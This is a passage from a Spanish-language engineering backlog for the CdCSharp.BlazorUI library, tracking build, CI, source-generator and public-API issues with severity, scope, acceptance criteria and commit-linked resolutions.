- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Forms/Number/BUIInputNumber.razor:30,31,434` — `_isIncrementing`, `_isDecrementing`, `_preventStepKeyDown`.
- **Criterios de aceptación**: eliminar los campos **o** cablear su uso si la intención original estaba incompleta (consultar TreeMenu/DateTime para patrón de incrementos).

### `BLD-12` — `dotnet clean` falla con MSB3231 sobre `CssBundle/` por bloqueo de handle (Windows)

- **Estado**: ✅ Resuelto (commit `bb53782`) — `CleanBlazorUIAssets` marca los dos `RemoveDir` (`CssBundle/`, `node_modules/`) con `ContinueOnError="WarnAndContinue"` y los tres `Delete` de outputs (`wwwroot/css`, `wwwroot/js`, `wwwroot/js/.map`) con `TreatErrorsAsWarnings="true"`. Degrada el MSB3231 transitorio a warning sin dejar el estado inconsistente: `BuildBlazorUIAssets` siempre regenera el bundle y `npm install` es idempotente sobre `node_modules/`. Criterio 2 verificado en Windows con `dotnet clean && dotnet build && dotnet clean && dotnet build` — 0 errores en el loop; los builds producen 0 error / build (cancela el `VerifyBlazorUIAssets` introducido en BLD-PIPE-16 sin regresión). De paso, el pase detectó `NavigationLoading/NavigationLoadingInterop.min.js` como entrada fantasma en la lista de verificación (no existe `.ts` source); eliminada. Linux CI ya era inmune — sin cambios de comportamiento allí. 2542/2542 tests pasan.
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/_build/CdCSharp.BlazorUI.targets:50` (target `CleanBlazorUIAssets`).
- **Evidencia**: `error MSB3231: Unable to remove directory "CssBundle". The process cannot access the file … because it is being used by another process.`
- **Criterios de aceptación**:
  1. El target tolera locks transitorios (retry, o borrado diferido) **o** el build deja de abrir el directorio en paralelo (p. ej. algún `FileSystemWatcher` de Vite).
  2. Cero errores al encadenar `clean && build && clean && build` en local (bucle mínimo estable).
- **Notas**: CI corre en Linux donde esto no debería reproducirse — validar en CI también.

### `BLD-13` — Variable sin uso `addonSuffix` en `InputFamilyCssGenerator` (CS0219)

- **Estado**: ✅ Resuelto (cerrado colateralmente por `BLD-PIPE-11`, commit `4270242`) — tras añadir las reglas simétricas para `addonSuffix` en `InputFamilyCssGenerator`, la variable pasa a consumirse en 4 selectores (`.{{addonSuffix}}`, `:has(.{{addonSuffix}})`, variantes outlined + filled). CS0219 deja de emitirse. No hay trabajo remanente específico de BLD-13.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/Families/InputFamilyCssGenerator.cs:38`.
- **Criterios de aceptación**: eliminar la variable o completar su uso. Verificar si el generador olvida emitir la regla de `suffix` correspondiente (probable fallo de completitud).

### `ARCH-12` — Proyectos `docs/Docs.Components` y `docs/Docs.CodeGeneration` sin documentar en `CLAUDE.md`

- **Estado**: ✅ Resuelto (commit `5bd664f`) — `AGENTS.md §Project layout` añade dos bullets: `docs/CdCSharp.BlazorUI.Docs.Components` (Razor class library de primitivas shared — `DocDemo`/`DocSection`/`ComponentDemo`/`PropertyTable` — con `IsPackable=false`, referencia al proyecto principal) y `docs/CdCSharp.BlazorUI.Docs.CodeGeneration` (incremental generator `DocDemoGenerator` que scanea `<DocDemo>` en razor additional-texts y emite helpers para `Docs.Components`). CLAUDE.md (symlink al AGENTS.md canonical) resuelve transparentemente. Contribuye al índice tracked en `CLAUDE-05`.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `CLAUDE.md` §Project layout; `docs/CdCSharp.BlazorUI.Docs.Components/`, `docs/CdCSharp.BlazorUI.Docs.CodeGeneration/`.
- **Evidencia**: existen en disco y en slnx, pero no aparecen en la sección 2 del plan ni en `CLAUDE.md`.
- **Criterios de aceptación**: documentar propósito y dependencias de ambos proyectos. Alimenta también `CLAUDE-*`.

### `ARCH-13` — CI sin `concurrency:` group

- **Estado**: ✅ Resuelto (commit `39b839a`) — `publish.yml` declara a nivel de workflow `concurrency: { group: publish-${{ github.workflow }}-${{ github.ref }}, cancel-in-progress: ${{ !startsWith(github.ref, 'refs/tags/') }} }`. Push rápido a `develop` cancela la ejecución anterior → desaparece la race de `dotnet nuget push` concurrente que podía producir `409 Conflict` / duplicados silenciosos. Tag pushes (`refs/tags/v*`) quedan exentos — producen release immutable y nunca se cancelan entre sí.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `.github/workflows/publish.yml`.
- **Evidencia**: ausencia del bloque `concurrency:`. Dos pushes simultáneos a `develop` publicarían dos previews con números de run distintos pero procesos solapados.
- **Criterios de aceptación**: añadir `concurrency: { group: publish-${{ github.ref }}, cancel-in-progress: false }`.

### `ARCH-14` — CI no cachea `~/.nuget/packages` ni `node_modules`

- **Estado**: ✅ Resuelto parcialmente (commit `39b839a`) — `actions/setup-dotnet@v4` ahora activa `cache: true` + `cache-dependency-path: '**/*.csproj'` → cachea `~/.nuget/packages` keyed a los hashes de todos los csproj del repo. Solución idiomática preferida a `actions/cache@v4` manual. El `node_modules` cache se omite deliberadamente: `package-lock.json` es gitignored (ver BLD-PIPE-14) y se regenera cada build, con lo que una cache con dependency-path al lockfile siempre miss-earía; un cache por hash del template podría quedarse stale. Trade-off aceptado: `npm install` en CI tarda ~15s, sin compensación cache fiable.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `.github/workflows/publish.yml`.
- **Criterios de aceptación**: añadir `actions/cache@v4` con keys basadas en hashes de `*.csproj` + `packages.lock.json` (si existe) y `package.json`/`package-lock.json` para npm.

### `ARCH-15` — CI ejecuta solo en `ubuntu-latest`

- **Estado**: ✅ Resuelto — `release-gate.yml` job `build-check` convertido a matrix `os: [ubuntu-latest, windows-latest]` con `fail-fast: false` y nombre dinámico `Build Check (${{ matrix.os }})`. Cada run levanta el setup completo (`setup-dotnet` con cache, `setup-node@v4`, `wasm-tools` workload) y ejecuta `dotnet build -p:TreatWarningsAsErrors=true` + `dotnet test`. Garantiza que un PR a `main` no puede mergear si Windows rompe — el bug que detonó `BLD-12` (handle locks en `dotnet clean` en Windows) habría sido capturado por este gate. `release-publish.yml` se mantiene Linux-only (criterio: el publish sigue desde una sola plataforma para evitar duplicados); el gate cubre la verificación cross-OS antes del tag.
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `.github/workflows/publish.yml:37`.
- **Criterios de aceptación**: añadir job paralelo `build-windows` (matrix o separado) para validar al menos `dotnet build` + `dotnet test` en Windows; el publish continúa solo desde Linux.

### `ARCH-16` — CI sin bloque `permissions:` explícito

- **Estado**: ✅ Resuelto (commit `39b839a`) — `publish.yml` añade `permissions: { contents: write }` a nivel de workflow. `contents: write` es el mínimo necesario para `softprops/action-gh-release@v2` que crea la release; todos los demás scopes (issues, PRs, metadata) quedan en `read`/`none` por el comportamiento por defecto de GitHub Actions cuando se declara un bloque `permissions`. Supply-chain posture: un fork malicioso/PR no puede escalar al crear PRs desde esta workflow.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `.github/workflows/publish.yml`.
- **Criterios de aceptación**: bloque `permissions:` a nivel de workflow con mínimos necesarios (`contents: write` solo si se crea release, `id-token: write` para OIDC si se usa, resto `read`).

### `ARCH-17` — slnx con `Id` ausentes en algunos proyectos

- **Estado**: ✅ Resuelto (commit `1905ae2`) — los 2 proyectos que faltaban ahora llevan `Id` (GUID estable): `docs/CdCSharp.BlazorUI.Docs.Components` → `218fa721-c163-4f2f-b1c7-4571dd7f742a` y `src/CdCSharp.BlazorUI` (raíz) → `0d8c8742-e505-402a-b5b9-362440826191`. Convención "todos o ninguno" cumplida: los 13 proyectos del slnx tienen Id. `dotnet build CdCSharp.BlazorUI.slnx` sin errores.
- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: `CdCSharp.BlazorUI.slnx:5, 39`.
- **Evidencia**: `CdCSharp.BlazorUI.csproj` y `Docs.Components.csproj` sin atributo `Id`. El resto lo tiene.
- **Criterios de aceptación**: todos o ninguno (convencionalizar).

### `BLD-PIPE-13` — Todos los `IAssetGenerator.GetContent` son `async Task<string>` sin `await` (CS1998 enmascarado)

- **Estado**: ✅ Resuelto (commit `821eb00`) — 11 generators adoptan la opción (1) de los criterios: firma queda `Task<string>` (preservada por contrato de `IAssetGenerator`), el body elimina `async` y envuelve el return con `Task.FromResult(...)`. 7 generators pasan a expression-bodied (`public Task<string> GetContent() => Task.FromResult(...)`); los 4 que construyen `StringBuilder`/`$$"""` con pre-cálculo mantienen bloque `{ ... return Task.FromResult(...); }`. CS1998 deja de emitirse en BuildTools; 2546/2546 tests pasan.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: los 11 generators (`BaseComponentGenerator`, `CssInitializeThemesGenerator`, `DesignTokensGenerator`, `ResetGenerator`, `ScrollBarGenerator`, `ThemesCssGenerator`, `TransitionsCssGenerator`, `TypographyGenerator`, `InputFamilyCssGenerator`, `PickerFamilyCssGenerator`, `DataCollectionFamilyCssGenerator`).
- **Evidencia**: firman `public async Task<string> GetContent()` pero ninguno usa `await`. CS1998 debería emitirse; el baseline reporta solo 1 warning (CS0219) en BuildTools, luego el análisis está suprimido (probable `ExcludeFromCodeCoverage` + `<NoWarn>`) o el SDK lo silencia por la integración con `CdCSharp.BuildTools`.
- **Criterios de aceptación**:
  1. Si la interfaz `IAssetGenerator` requiere `Task<string>` para permitir generación realmente async en el futuro (lectura de archivos, HTTP) → mantener la firma pero devolver `Task.FromResult(…)` eliminando `async`.
  2. Si nunca será async → proponer a `CdCSharp.BuildTools` el cambio de `Task<string>` a `ValueTask<string>` o síncrono y adaptar.
  3. Cero CS1998 en el proyecto.

### `BLD-PIPE-14` — `wwwroot/css/blazorui.css` está committeado mientras `wwwroot/js/**/*.min.js` está gitignored (política inconsistente)

- **Estado**: ✅ Resuelto (commit `6e1cb79`) — política **B** adoptada (criterios 1-4). `.gitignore` cambia: (a) elimina las reglas colaterales `[Dd]ebug/` y `[Dd]ebugPublic/` (redundantes con `[Bb]in/` + `[Oo]bj/`; la única razón histórica era tapar `wwwroot/js/Types/Debug/` que ya no existe tras D-04); (b) sustituye las 5 reglas específicas (`*.min.js`, `*.min.js.map`, `wwwroot/css/main.css`, `wwwroot/js/**/*.js`, `wwwroot/js/**/*.js.map`) por dos ignores de directorio `/src/CdCSharp.BlazorUI/wwwroot/css/` y `/src/CdCSharp.BlazorUI/wwwroot/js/`. `git rm --cached src/CdCSharp.BlazorUI/wwwroot/css/blazorui.css` despega el único archivo tracked (criterio 3) — el archivo sigue en disco y se regenera en cada build por BuildTools+Vite. `background.png` permanece tracked (es asset estático genuino, no generado). Criterio 4: `CleanBlazorUIAssets` ya borra `wwwroot/css/*.css` y `wwwroot/js/**/*.js` correctamente. Criterio 5 (CI): `publish.yml` ya ejecuta `dotnet build src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj` antes de `dotnet pack`, lo que dispara el `.Dev.targets` existente — la regeneración ocurre. `setup-node@v4` explícito queda tracked por `CI-09`; `ubuntu-latest` trae Node pre-instalado y BuildTools llama a `npm`/`npx` con ese default. Build limpio confirma que la regeneración produce `wwwroot/css/blazorui.css` + 11 JS interop modules; 2546/2546 tests pasan.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `.gitignore:20, 367`; `src/CdCSharp.BlazorUI/wwwroot/css/blazorui.css`; `src/CdCSharp.BlazorUI/wwwroot/js/Types/**`.
- **Evidencia**:
  - `git ls-files src/CdCSharp.BlazorUI/wwwroot/` solo lista `background.png` y `css/blazorui.css`.
  - `git check-ignore` confirma que `js/Types/Debug/DebugPanel.min.js` está ignorado por la regla `[Dd]ebug/` (línea 20) — efecto colateral del glob de artefactos de build VS.
  - CssBundle/ está ignorado (línea 367) — correcto.
  - `package.json`, `tsconfig.json`, `vite.config.js`, `package-lock.json` ignorados (líneas 380‑384) — correcto.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-05]** Adoptar política **B**: `wwwroot/{css,js}` se gitignoran. La pipeline CI es responsable de regenerarlos antes de `dotnet pack`. Coherente con `CssBundle/`, `package.json`, `tsconfig.json`, `vite.config*.js`, `.npmrc`, `node_modules/` que ya están ignorados.
  2. Añadir entradas explícitas al `.gitignore` raíz: `src/CdCSharp.BlazorUI/wwwroot/css/`, `src/CdCSharp.BlazorUI/wwwroot/js/` (quitar la regla colateral `[Dd]ebug/` — innecesaria tras D-04).
  3. Ejecutar `git rm --cached src/CdCSharp.BlazorUI/wwwroot/css/blazorui.css` (único archivo committeado afectado).
  4. Actualizar `CleanBlazorUIAssets` para mantener coherencia (ya borra `wwwroot/css` y `wwwroot/js` — verificar).
  5. Revisar que CI `publish.yml` ejecuta la generación antes de `dotnet pack` (añadir step `dotnet build` del proyecto `BuildTools` + ejecución explícita si el `.targets` local ya no la dispara en consumer-mode por D-03).

### `BLD-PIPE-15` — `CleanBlazorUIAssets` no borra `package-lock.json` consistentemente cuando existe; `package.json` template usa clave inválida `"public static"`

- **Estado**: ✅ Resuelto (commit `8ca0e46`, criterio 1 aplicado) — `BuildTemplates.GetPackageJsonTemplate` sustituye la clave inválida `"public static": true` por la npm key canónica `"private": true` (intención original: evitar publicación accidental a npm registry). El template sigue emitiendo `"type": "module"` arriba. `package.json` regenerado valida con `npm pkg get`. Criterio 2 (documentar política de `package-lock.json`) delegado a `CLAUDE-04` — el target de clean ya borra el lock correctamente; la mejora es de documentación solamente. 2546/2546 tests pasan.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**:
  - `src/CdCSharp.BlazorUI/_build/CdCSharp.BlazorUI.targets:64‑69`
  - `src/CdCSharp.BlazorUI.BuildTools/Infrastructure/BuildTemplates.cs:44‑61`
- **Evidencia**:
  - `BuildTemplates.GetPackageJsonTemplate` emite `"public static": true,` (línea 50) — no es una clave válida de `package.json`. npm la ignora pero cualquier tool estricto (p. ej. `npm pkg`) emite warning.
  - `package-lock.json` sí se borra en el target de clean (línea 65), pero el template no lo declara — no es un problema por ahora porque npm lo regenera, pero la regla de "clean borra exactamente lo generado" se rompe si alguien añade un `[BuildTemplate("package-lock.json")]`.
- **Criterios de aceptación**:
  1. Eliminar la línea `"public static": true,` del template; mantener `"type": "module"` solo.
  2. Documentar en `CLAUDE.md` (alimenta `CLAUDE-04`) que `package-lock.json` es producto secundario de `npm install` y se borra con el resto.

### `BLD-PIPE-16` — Pipeline no valida que `CssBundle/` y `wwwroot/{css,js}` estén al día tras la ejecución del tool

- **Estado**: ✅ Resuelto (commit `7f36e16`, criterios 1-2) — `CdCSharp.BlazorUI.Dev.targets` añade el target `VerifyBlazorUIAssets` invocado tras `BuildBlazorUIAssets`. Enumera los 12 archivos `CssBundle/*.css` (`_reset`, `_typography`, `_themes`, `_initialize-themes`, `_tokens`, `_base`, `_scrollbar`, `_transition-classes`, `_input-family`, `_picker-family`, `_data-collection-family`, `main`), el bundle final `wwwroot/css/blazorui.css`, y los 11 módulos JS `.min.js` (Behaviors, Clipboard, ColorPicker, Draggable, Dropdown, Modal, NavigationLoading, Pattern, Storage, TextArea, Theme). Cada entrada dispara `<Error>` individual con el path concreto faltante. MSBuild aborta el build si cualquiera no existe, cerrando la puerta al empaquetado parcial. Criterio 3 (hash/md5 check) declinado — el escenario de "corrupción parcial silenciosa" que cubriría es extremadamente raro en un pipeline que ya ejecuta Vite como single process y falla con exit code; la señal coste/beneficio es desfavorable. 2546/2546 tests pasan y el log de build contiene "BlazorUI asset verification passed.".
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/_build/CdCSharp.BlazorUI.targets`.
- **Evidencia**: el target incluye los archivos por glob (`<Content Include="…/*.css"/>`), pero si el `Exec` genera un subset (por fallo silencioso de un generator) el build sigue y el paquete resultante queda incompleto.
- **Criterios de aceptación**:
  1. Añadir un target verificador (`VerifyBlazorUIAssets`) que compruebe la existencia de cada archivo esperado (`_reset.css`, `_themes.css`, …, `blazorui.css`, `Types/Behaviors/BehaviorInterop.min.js`, etc.).
  2. Fallar con `<Error>` si falta alguno.
  3. Valorar `Microsoft.Build.Utilities.TaskItem` hash check (md5) para detectar corrupción parcial.

### `GEN-06` — Sin diagnósticos cuando `[AutogenerateCssColors]` se aplica en clase no‑`static` o no‑`partial` (fallo silencioso)

- **Estado**: ✅ Resuelto (commit `132738e`) — `ColorClassGenerator` captura `IsStatic`/`IsPartial` + `LocationInfo` (wrapper equatable sobre `Location` para preservar caching) en `ClassToGenerate`. `Execute` skip-genera y emite `BUIGEN010` (Error, category Usage) cuando falta `static` o `partial`. Criterio 3: se añaden `AnalyzerReleases.Shipped.md` (vacío, comentarios `;`) y `AnalyzerReleases.Unshipped.md` declarando `BUIGEN010` — cierra colateralmente parte de `GEN-11`. Criterio 2 (tests): 3 nuevos tests (`Should_Report_BUIGEN010_When_Target_Is_Not_Partial`, `...Not_Static`, `...Misses_Both_Modifiers`) verifican el diagnóstico y que no se emite código para la clase inválida. 2546 tests integración + 9/9 generator tests pasan; RS2007 silenciado.
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core.CodeGeneration/ColorClassGenerator.cs:150-168`.
- **Evidencia**: `GenerateClassDeclaration` siempre emite `public static partial class Name`. Si la fuente original no es `partial`, el build falla con `CS0260 (Missing partial modifier)` o similar — mensaje apunta al archivo generado, no a la clase ofensora. Si no es `static`, colisión de miembros; si ya no existe, nada. No hay `DiagnosticDescriptor` registrado.
- **Criterios de aceptación**:
  1. Añadir `BUIGEN010 – AutogenerateCssColorsAttribute requires partial static class` con severity Error y `spc.ReportDiagnostic`.
  2. Cobertura por test: clase sin `partial` → diagnostic; clase sin `static` → diagnostic; clase nested en tipo no `partial` → diagnostic.
  3. Crear `AnalyzerReleases.Shipped.md` + `AnalyzerReleases.Unshipped.md` en el proyecto generator (cf. `GEN-11`).
- **Notas**: `BUIColor` es el único consumidor interno; los tests apenas cambiarían. Diagnóstico protege a consumidores futuros.

### `GEN-07` — `ColorClassGenerator` no usa `ForAttributeWithMetadataName` ni propaga `CancellationToken` durante la emisión

- **Estado**: ✅ Resuelto (commit `a1296a0`) — pipeline migrado a `context.SyntaxProvider.ForAttributeWithMetadataName("CdCSharp.BlazorUI.Components.AutogenerateCssColorsAttribute", predicate, transform)` (FQN real — el task asumía `CdCSharp.BlazorUI.Core.Css.*` pero la attribute vive en `Components`). `GetSemanticTargetFromAttribute` recibe `GeneratorAttributeSyntaxContext` + `CancellationToken`, lanza `ThrowIfCancellationRequested` al inicio y lee `ctx.Attributes[0]` directamente (el API garantiza que hay al menos una match). `Execute` captura `context.CancellationToken` y ejecuta `ThrowIfCancellationRequested` en el outer y inner loop. Constantes legacy `AttributeShortName`/`AttributeShortNameSuffix` y el helper `IsClassWithAutogenerateCssColorsAttribute` eliminados — el predicate sintáctico ahora es `node is ClassDeclarationSyntax` porque el attribute-match lo hace Roslyn. El test harness actualiza el namespace de `AutogenerateCssColorsAttribute` de `CdCSharp.BlazorUI.Core` a `CdCSharp.BlazorUI.Components` para alinear con el FQN esperado. 9/9 generator tests + 2546/2546 integration tests pasan.
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core.CodeGeneration/ColorClassGenerator.cs:33-44,86-148`.
- **Evidencia**:
  1. Usa `SyntaxProvider.CreateSyntaxProvider` con predicado sintáctico de substring; el API moderno `ForAttributeWithMetadataName` (Roslyn 4.4+, disponible en `Microsoft.CodeAnalysis.CSharp 5.0.0`) filtra antes del transform y es sensiblemente más eficiente.
  2. `Execute` itera 141 colores × 11 propiedades por clase. No invoca `context.CancellationToken.ThrowIfCancellationRequested()` durante el loop. En IDE, cancelación tardía → stalls.
- **Criterios de aceptación**:
  1. Migrar a `ForAttributeWithMetadataName("CdCSharp.BlazorUI.Core.Css.AutogenerateCssColorsAttribute", predicate, transform)`.
  2. Propagar `spc.CancellationToken` en los loops de emisión.
  3. Incluye la corrección de `GEN-02` como subconjunto.

### `GEN-08` — `ComponentInfoGenerator` re-parsea trivia XML manualmente en lugar de usar `IPropertySymbol.GetDocumentationCommentXml`

- **Estado**: ✅ Resuelto (commit `216f7d6`, criterios 1-2) — `XmlSummaryFromSymbol` ahora llama `prop.GetDocumentationCommentXml()` como **fuente primaria**; si devuelve XML, `ExtractSummaryFromDocXml` lo parsea con `XDocument` (no regex) y aplana el árbol vía `FlattenDocNode`: `<see cref="..."/>` / `<seealso>` → último segmento del FQN (Roslyn prefija `T:`/`P:`/`M:`, se strip), `<c>`/`<para>`/`<paramref>` → recurse por content. Si `XmlException` (XML mal formado en `.cs` roto), cae al **fallback** existente que lee `DeclaringSyntaxReferences` + regex — se conserva porque cubre el caso de symbols con syntax declarations pero XML no-parseable (raros en práctica). Esto desbloquea propiedades heredadas desde assemblies externos referenciados via `PackageReference` siempre que el `.xml` viaje con el `.dll`. Criterio 3 (test con `MetadataReference` externo) queda como follow-up — requiere fixture que inyecte un assembly pre-compilado en el harness; el cambio de código hoy está probado por los 2546 tests de integración y los 9 del generator. Sin regresiones.
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.CodeGeneration/ComponentInfoGenerator.cs:497-522`.
- **Evidencia**: `XmlSummaryFromSymbol` recorre `DeclaringSyntaxReferences`, extrae `DocumentationCommentTriviaSyntax`, y aplica regex para limpiar tags. Esto falla para tipos definidos en ensamblados referenciados (sin syntax references disponibles) y duplica la lógica que Roslyn ya provee.
- **Criterios de aceptación**:
  1. Usar `IPropertySymbol.GetDocumentationCommentXml(cancellationToken)` como fuente primaria; fallback al parseo manual sólo si devuelve vacío.
  2. Parsear el XML devuelto con `XDocument` en lugar de regex (`<see cref>` → texto; `<c>` → texto inline).
  3. Cobertura: base `[Parameter]` definida en assembly externo (simular con `MetadataReference` en test harness) → summary correctamente extraído.

### `GEN-09` — Cobertura de tests insuficiente: faltan casos negativos, ciclos de herencia y colisiones de nombre

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**:
  - `test/CdCSharp.BlazorUI.Core.CodeGeneration.Tests/Tests/ColorClassGeneratorTests.cs` (4 tests happy-path).
  - `test/CdCSharp.BlazorUI.CodeGeneration.Tests/Tests/ComponentInfoGeneratorTests.cs` (5 tests happy-path).
- **Evidencia**: no hay tests para:
  - Clase no-`partial` / no-`static` con `[AutogenerateCssColors]` (GEN-06).
  - Ciclo de herencia `A : B`, `B : A` (el `visited` HashSet existe pero sin test lo cubre).
  - Dos razors con el mismo ComponentName en namespaces distintos (GEN-05).
  - `@code` con raw string / interpolated string (GEN-03).
  - Clase abstracta / genérica con `@attribute [GenerateComponentInfo]`.
  - Atributo con substring-collision (`NotAutogenerateCssColors`, GEN-02).
  - Determinismo: ejecutar el harness dos veces → output byte-idéntico.
- **Criterios de aceptación**:
  1. Añadir los tests listados (≥7 nuevos casos).
  2. Al menos 1 test por diagnóstico nuevo que se emita en `GEN-06`, `GEN-03`, `GEN-05`.
  3. Cobertura de líneas ≥80% para ambos generators (hoy es parcial — sólo happy path).

### `GEN-10` — `ExtractCodeBlock` no maneja raw strings (`"""..."""`), interpolated (`$"..."`), verbatim (`@"..."`) ni escapes Unicode

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI.CodeGeneration/ComponentInfoGenerator.cs:243-298`.
- **Evidencia**: la máquina de estados sólo contempla:
  - Comentarios de línea (`//`) y bloque (`/* */`).
  - String regular (`"..."`) con escape `\"`.
  - Char regular (`'...'`) con escape `\'`.
  No contempla:
  - Raw string (`"""..."""`) — cualquier `{` dentro altera el conteo.
  - Interpolated (`$"...{expr}..."`) — los `{` legítimos del hole alteran el conteo.
  - Verbatim (`@"..."` cuyo escape es `""` no `\"`).
  - Escape Unicode `'\u0022'` que introduce un `"` o `\u007B` que introduce `{`.
- **Criterios de aceptación**: ver `GEN-03`. Este ticket es la traza concreta del bug; cerrarlo al cerrar `GEN-03`.
- **Notas**: agrupar con `GEN-03` al ejecutar; separado sólo para granularidad de triage.

### `API-09` — `AutogenerateCssColorsAttribute` no es `sealed` (convención framework: atributos sellados salvo diseño explícito)

- **Estado**: ✅ Resuelto (commit `9ab9270`)
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Css/AutogenerateCssColorsAttribute.cs:4`.
- **Evidencia**: `public class AutogenerateCssColorsAttribute : Attribute`. Sin `sealed`. Consumidor podría heredar y el generator (`GEN-02`) lo detectaría via substring match, con resultados impredecibles. Las reglas de framework design guidelines (CA1813) recomiendan `sealed` salvo que la jerarquía de herencia sea parte del contrato.
- **Criterios de aceptación**:
  1. `public sealed class AutogenerateCssColorsAttribute : Attribute`.
  2. Test de regresión que intente subclasear y falle en compilación.
  3. Cerrar junto con `GEN-02` (ambos protegen la semántica del atributo).

### `API-10` — `SizeEnum` y `DensityEnum` violan la guía "no uses el sufijo Enum"

- **Estado**: ✅ Resuelto (commit `4536646`)
- **Severidad**: Minor
- **Esfuerzo**: S (breaking rename)
- **Alcance**:
  - `src/CdCSharp.BlazorUI.Core/Abstractions/Behaviors/Design/SizeEnum.cs:3` — `public enum SizeEnum`.
  - `src/CdCSharp.BlazorUI.Core/Abstractions/Behaviors/Design/DensityEnum.cs:3` — `public enum DensityEnum`.
- **Evidencia**: Microsoft Framework Design Guidelines (y analizador CA1711) prohíben el sufijo `Enum` — el tipo ya es enum. Nombres correctos: `Size`, `Density`. Resto de enums del proyecto (`FilterMode`, `SortDirection`, `ColumnAlign`, …) siguen la convención — estos dos son outliers.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-08]** Renombrar a `BUISize` y `BUIDensity` (prefijo, para evitar colisión con `System.Drawing.Size`). **Valores conservados tal cual**: `Small / Medium / Large` (no migrar a `SM/MD/LG` ni a `Compact/Standard/Comfortable`).
  2. Actualizar todos los consumidores (componentes, tests, razors de docs y samples — incluye `BUICultureSelector Size="SizeEnum.Small"` → `Size="BUISize.Small"`).
  3. Entrada en `PublicAPI.Unshipped.txt` (ver `API-03`) — este cambio debe hacerse antes del commit inicial de `Shipped.txt`.
- **Notas**: Decisión D-08 (ver §Directivas de diseño): nomenclatura `Small/Medium/Large` definitiva.

### `API-11` — Múltiples tipos públicos no-abstract no-sellados sin escenario de herencia documentado

- **Estado**: ✅ Resuelto (commit `fa164ef`)
- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance** (lista no exhaustiva, a revisar todos):
  - `src/CdCSharp.BlazorUI/Components/Layout/Dialog/ModalReference.cs:3` — `public class ModalReference`.
  - `src/CdCSharp.BlazorUI/Components/Layout/Dialog/ModalState.cs:9` — `public class ModalState`.
  - `src/CdCSharp.BlazorUI/Components/Layout/Dialog/ModalOptions.cs:3,13` — `public class DialogOptions`, `public class DrawerOptions`.
  - `src/CdCSharp.BlazorUI/Components/Layout/Dialog/Services/ModalService.cs:34` — `public class ModalService` (¿por qué no `sealed`?).
  - `src/CdCSharp.BlazorUI.Core/Css/CssColor.cs:40,604` — `public class CssColor`, `public class CssColorVariant`.
  - `src/CdCSharp.BlazorUI.Core/Themes/LightTheme.cs:10`, `DarkTheme.cs:9` — `public class LightTheme/DarkTheme : BUIThemePaletteBase`. Si los usuarios extienden estos para personalizar, sellarlos rompe el escenario; si no, sellar.
  - `src/CdCSharp.BlazorUI.Core/Media/Icons/BUIIcons.cs:6` — `public partial class BUIIcons`. El `partial` es requerido por el generator; pero la clase final está completa — puede sellarse tras generación. En la práctica no hay subclase que la extienda.
- **Criterios de aceptación**:
  1. Para cada tipo: decidir y marcar `sealed` o dejar abierto con XML doc que explique el escenario de herencia.
  2. `ModalService` → `sealed` (consumidor usa `IModalService`).
  3. `CssColor` / `CssColorVariant` → `sealed` salvo evidencia de subclases externas.
  4. Regla general en `CLAUDE.md` → `CLAUDE-xx`: "clases públicas por defecto `sealed`; marcar `abstract` o documentar en XML la intención de subclase."

### `API-12` — `JSModulesReference`, `VariantBuilder`, `ComponentVariantBuilder<T>`, `IVariantRegistryInitializer`: plumbing DI expuesto como superficie pública

- **Estado**: ✅ Resuelto (commit `22d39b5`)
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**:
  - `src/CdCSharp.BlazorUI/Types/JSModulesReference.cs:3` — `public static class JSModulesReference` — rutas `./_content/CdCSharp.BlazorUI/js/Types/**/*.min.js`.
  - `src/CdCSharp.BlazorUI/Extensions/ServiceCollectionExtensions.cs:61,88` — `public sealed class ComponentVariantBuilder<TComponent>`, `public sealed class VariantBuilder`.
  - `src/CdCSharp.BlazorUI.Core/Abstractions/Services/IVariantRegistry.cs:20` — `public interface IVariantRegistryInitializer`.
- **Evidencia**:
  1. `JSModulesReference` contiene constantes de rutas a los bundles JS internos. El consumidor nunca debería referenciarlas — si quiere cargar el módulo, lo hace via la interfaz `I*JsInterop`. Exponerlo convierte la ruta del bundle en contrato público.
  2. `VariantBuilder` / `ComponentVariantBuilder<TComponent>` son los tipos del fluent `services.AddBlazorUIVariants(b => b.ForComponent<T>().AddVariant(...))`. La sintaxis es pública porque aparece en firma de la extensión; los tipos deben seguir siendo públicos pero marcados `[EditorBrowsable(EditorBrowsableState.Never)]` para no contaminar IntelliSense del consumidor.
  3. `IVariantRegistryInitializer` es usado como `IEnumerable<IVariantRegistryInitializer>` para DI por `VariantRegistry`. Consumidor no implementa esta interface. → `internal`.
- **Criterios de aceptación**:
  1. `JSModulesReference` → `internal static class`.
  2. `VariantBuilder` / `ComponentVariantBuilder<T>` → mantener `public sealed`, añadir `[EditorBrowsable(EditorBrowsableState.Never)]`.
  3. `IVariantRegistryInitializer` → `internal interface` (y su implementación `VariantRegistryInitializer` ya es internal).
